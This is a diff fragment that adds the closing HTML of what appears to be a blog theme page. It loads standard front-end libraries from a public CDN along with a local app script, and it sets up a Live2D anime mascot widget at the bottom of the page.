+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"bottom","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
